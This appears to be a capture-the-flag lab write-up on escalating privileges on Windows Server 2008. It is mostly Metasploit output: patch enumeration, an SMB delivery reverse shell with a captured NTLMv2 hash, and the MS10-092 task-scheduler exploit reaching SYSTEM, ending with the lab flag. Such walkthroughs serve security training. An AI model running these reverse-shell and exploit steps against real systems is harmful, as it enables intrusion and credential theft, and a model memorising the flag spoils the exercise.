---
description: Windows Server 2008/2008 R2 were made end-of-life on January 14, 2020.
---

# Windows Server

### Server 2008 vs. Newer Versions

<table><thead><tr><th width="231">Feature</th><th width="128">Server 2008 R2</th><th width="152">Server 2012 R2</th><th width="128">Server 2016</th><th>Server 2019</th></tr></thead><tbody><tr><td><a href="https://docs.microsoft.com/en-us/mem/configmgr/protect/deploy-use/defender-advanced-threat-protection">Enhanced Windows Defender Advanced Threat Protection (ATP)</a></td><td></td><td></td><td></td><td>X</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview?view=powershell-7.1">Just Enough Administration</a></td><td>Partial</td><td>Partial</td><td>X</td><td>X</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard">Credential Guard</a></td><td></td><td></td><td>X</td><td>X</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard">Remote Credential Guard</a></td><td></td><td></td><td>X</td><td>X</td></tr><tr><td><a href="https://techcommunity.microsoft.com/t5/iis-support-blog/windows-10-device-guard-and-credential-guard-demystified/ba-p/376419">Device Guard (code integrity)</a></td><td></td><td></td><td>X</td><td>X</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview">AppLocker</a></td><td>Partial</td><td>X</td><td>X</td><td>X</td></tr><tr><td><a href="https://www.microsoft.com/en-us/windows/comprehensive-security">Windows Defender</a></td><td>Partial</td><td>Partial</td><td>X</td><td>X</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard">Control Flow Guard</a></td><td></td><td></td><td>X</td><td>X</td></tr></tbody></table>

## Server 2008 Case Study

For an older OS like Windows Server 2008, we can use an enumeration script like [Sherlock](https://github.com/rasta-mouse/Sherlock) to look for missing patches. We can also use something like [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester), which takes the results of the `systeminfo` command as an input, and compares the patch level of the host against the Microsoft vulnerability database to detect potential missing patches on the target.

**Querying Current Patch Level**

```cmd-session
C:\htb> wmic qfe

Caption                                     CSName      Description  FixComments  HotFixID   InstallDate  InstalledBy               InstalledOn  Name  ServicePackInEffect  Status
http://support.microsoft.com/?kbid=2533552  WINLPE-2K8  Update                    KB2533552               WINLPE-2K8\Administrator  3/31/2021
```

**Running Sherlock**

```powershell-session
PS C:\htb> Set-ExecutionPolicy bypass -Scope process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic. Do you want to change the execution
policy?
[Y] Yes  [N] No  [S] Suspend  [?] Help (default is "Y"): Y


PS C:\htb> Import-Module .\Sherlock.ps1
PS C:\htb> Find-AllVulns
```

## Assessment

**Obtain a shell on the target host, enumerate the system and escalate privileges. Submit the contents of the flag.txt file on the Administrator Desktop.**

<details>

<summary>Vulnerablility Enumeration</summary>

```
python3 windows-exploit-suggester.py --database 2023-07-19-mssb.xls --systeminfo systeminfo.txt
[*]initiating winsploit version 3.3...
[*]database file detected as xls or xlsx based on extension
[*]attempting to read from the systeminfo input file
[+]systeminfo input file read successfully (utf-8)
[*]querying database file for potential vulnerabilities
[*]comparing the 1 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*]there are now 197 remaining vulns
[+][E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+]windows version identified as 'Windows 2008 R2 64-bit'
[*]
[M]MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M]MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E]MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]  http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]  http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*]
[E]MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M]MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M]MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E]MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E]MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M]MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M]MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*]done
```



```
PS C:\Tools> Find-AllVulns

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Appears Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Appears Vulnerable

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable
```

```
2010-3338 -> vulnerable
```

</details>

<details>

<summary>MSFCONSOLE getting reverse shell 1</summary>

```
msfconsole -q
[*] Starting persistent handler(s)...
msf6 > search smb_delivery

Matching Modules
================

   #  Name                              Disclosure Date  Rank       Check  Description
   -  ----                              ---------------  ----       -----  -----------
   0  exploit/windows/smb/smb_delivery  2016-07-26       excellent  No     SMB Delivery


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/smb/smb_delivery

msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/smb_delivery) > options

Module options (exploit/windows/smb/smb_delivery):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   FILE_NAME    test.dll         no        DLL file name
   FOLDER_NAME                   no        Folder name to share (Default none)
   SHARE                         no        Share (Default Random)
   SRVHOST      0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT      445              yes       The local port to listen on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.255.128  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   DLL



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/smb_delivery) > set srvhost 10.10.14.5
srvhost => 10.10.14.5
msf6 exploit(windows/smb/smb_delivery) > set lhost 10.10.14.5
lhost => 10.10.14.5
msf6 exploit(windows/smb/smb_delivery) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(windows/smb/smb_delivery) > 
[*] Started reverse TCP handler on 10.10.14.5:4444 
[*] Server is running. Listening on 10.10.14.5:445
[*] Server started.
[*] Run the following command on the target machine:
rundll32.exe \\10.10.14.5\swQgSo\test.dll,0
[SMB] NTLMv2-SSP Client     : 10.129.60.112
[SMB] NTLMv2-SSP Username   : WINLPE-2K8\htb-student
[SMB] NTLMv2-SSP Hash       : htb-student::WINLPE-2K8:c1f04b72d207ecde:4c2734cc1999eedf9fc63fcb45263e76:01010000000000008079f1cb9dbbd901d34dc0e3b7934156000000000200120057004f0052004b00470052004f00550050000100120057004f0052004b00470052004f00550050000400120057004f0052004b00470052004f00550050000300120057004f0052004b00470052004f0055005000070008008079f1cb9dbbd901060004000200000008003000300000000000000000000000002000000a4ee8e1c6f218641350275faef4c4a098d981c7f192421cfd5249fc4527a0040a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003500000000000000000000000000

[*] Sending stage (175686 bytes) to 10.129.60.112
[*] Meterpreter session 1 opened (10.10.14.5:4444 -> 10.129.60.112:49159) at 2023-07-21 02:37:36 -0400
```

</details>

<details>

<summary>MSFCONSOLE migrating from 32 bit process to 64 bit</summary>

```
msf6 exploit(windows/local/ms10_092_schelevator) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > ps

Process List
============

 PID   PPID  Name                     Arch  Session  User                    Path
 ---   ----  ----                     ----  -------  ----                    ----
 0     0     [System Process]
 4     0     System
 268   4     smss.exe
 284   456   svchost.exe
 356   344   csrss.exe
 396   344   wininit.exe
 408   388   csrss.exe
 456   396   services.exe
 480   388   winlogon.exe
 492   396   lsass.exe
 500   396   lsm.exe
 624   456   svchost.exe
 700   456   svchost.exe
 780   456   svchost.exe
 788   480   LogonUI.exe
 832   456   svchost.exe
 892   456   svchost.exe
 936   456   svchost.exe
 976   456   svchost.exe
 1032  456   spoolsv.exe
 1100  456   svchost.exe
 1168  456   VGAuthService.exe
 1216  456   vmtoolsd.exe
 1244  456   ManagementAgentHost.exe
 1428  456   svchost.exe
 1488  624   WmiPrvSE.exe
 1660  456   svchost.exe
 1712  456   svchost.exe
 1768  456   dllhost.exe
 1956  456   msdtc.exe
 2128  2708  powershell.exe           x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 2168  2296  conhost.exe              x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\conhost.exe
 2296  2288  csrss.exe
 2320  2288  winlogon.exe
 2464  2936  rundll32.exe             x86   2        WINLPE-2K8\htb-student  C:\Windows\SysWOW64\rundll32.exe
 2484  456   taskhost.exe             x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\taskhost.exe
 2624  1660  rdpclip.exe              x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\rdpclip.exe
 2684  936   dwm.exe                  x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\dwm.exe
 2708  2676  explorer.exe             x64   2        WINLPE-2K8\htb-student  C:\Windows\explorer.exe
 2828  456   sppsvc.exe
 2968  2708  vmtoolsd.exe             x64   2        WINLPE-2K8\htb-student  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe

meterpreter > getpid
Current pid: 2464
meterpreter > migrate 2484
[*] Migrating from 2464 to 2484...
[*] Migration completed successfully.
meterpreter > bg

```

</details>

<details>

<summary>MSFCONSOLE privilege escalation</summary>

```
msf6 exploit(windows/local/ms10_092_schelevator) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/ms10_092_schelevator) > set lhost 10.10.14.5
lhost => 10.10.14.5
msf6 exploit(windows/local/ms10_092_schelevator) > set lport 4443
lport => 4443
msf6 exploit(windows/local/ms10_092_schelevator) > show options

Module options (exploit/windows/local/ms10_092_schelevator):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   SESSION   1                yes       The session to run this module on
   TASKNAME                   no        A name for the created task (default random)


Payload options (windows/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.5       yes       The listen address (an interface may be specified)
   LPORT     4443             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Vista / 7 / 2008 (Dropper)



View the full module info with the info, or info -d command.

msf6 exploit(windows/local/ms10_092_schelevator) > exploit

[*] Started reverse TCP handler on 10.10.14.5:4443 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated.
[*] Preparing payload at C:\Users\HTB-ST~1\AppData\Local\Temp\gRCxSMaEjzjdA.exe
[*] Creating task: S0S2wWa7f
[*] Reading the task file contents from C:\Windows\system32\tasks\S0S2wWa7f...
[*] Original CRC32: 0x8f5b6b25
[*] Final CRC32: 0x8f5b6b25
[*] Writing our modified content back...
[*] Validating task: S0S2wWa7f
[*] Disabling the task...
[*] SUCCESS: The parameters of scheduled task "S0S2wWa7f" have been changed.
[*] Enabling the task...
[*] SUCCESS: The parameters of scheduled task "S0S2wWa7f" have been changed.
[*] Executing the task...
[*] Sending stage (240 bytes) to 10.129.60.112
[*] Command shell session 2 opened (10.10.14.5:4443 -> 10.129.60.112:49160) at 2023-07-21 02:44:54 -0400
[*] Deleting task S0S2wWa7f...


Shell Banner:
Microsoft Windows [Version 6.1.7600]
-----
          

C:\Windows\system32>whoami
whoami
nt authority\system
C:\Users\Administrator\Desktop>type flag.txt
type flag.txt
L3gacy_st1ill_pr3valent!
```

</details>
